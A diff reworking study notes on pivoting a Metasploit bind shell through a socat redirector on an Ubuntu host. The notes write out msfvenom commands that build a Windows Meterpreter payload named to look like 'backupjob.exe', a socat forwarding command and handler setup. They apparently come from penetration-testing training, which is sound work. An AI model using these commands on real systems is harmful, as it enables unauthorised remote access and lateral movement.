@@ -1,19 +1,29 @@
 **Overview:**
-In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.
+- In bind shell scenarios, the Windows target starts a listener on a specific port. A socat redirector on the Ubuntu pivot host forwards incoming connections from the Metasploit handler to the bind shell on the Windows target.
+- The attack host connects to socat on the pivot host, which transparently forwards traffic to the Windows bind shell, allowing Metasploit to receive a Meterpreter session pivoted through the Ubuntu server.
+---
+## Payload Generation
+
+```
+msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
+```
+
+Generate a bind shell payload for the Windows target. `-p` payload, `-f` output format, `-o` output file, `LPORT` port the bind shell will listen on.
 
 ---
-	
-	```
-msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
-We can create a bind shell using msfvenom
+## Socat Redirector
 
 ```
-socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
+socat TCP4-LISTEN:8080,fork TCP4:<target>:8443
 ```
-```
-start a `socat bind shell` listener, which listens on port `8080` and forwards packets to Windows server `8443`.
+
+Start the socat redirector on the pivot host. Listens on port `8080` and forwards all incoming packets to the Windows target on port `8443`. `fork` allows handling multiple simultaneous connections.
+
+---
+## Metasploit Handler
 
 ```
-msf6 > use exploit/multi/handler
+use exploit/multi/handler
 ```
-We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.
+
+Set up the bind handler in Metasploit on the attack host. Point it at the pivot host's socat listener port (`8080`). Upon payload execution on the Windows target, Metasploit receives the session pivoted through the socat redirector.
